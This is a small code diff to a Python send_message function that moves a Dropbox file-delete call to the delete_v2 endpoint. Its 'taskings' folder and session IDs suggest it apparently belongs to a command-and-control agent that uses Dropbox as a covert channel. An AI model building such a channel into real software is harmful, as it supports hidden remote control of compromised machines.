@@ -50,7 +50,7 @@ def send_message(packets=None):
             del headers["Dropbox-API-Arg"]
             datastring = '{"path":"%s/%s.txt"}' % (taskingsFolder, sessionID)
             nothing = post_message(
-                "https://api.dropboxapi.com/2/files/delete", datastring, headers
+                "https://api.dropboxapi.com/2/files/delete_v2", datastring, headers
             )
 
         return ("200", resultdata)
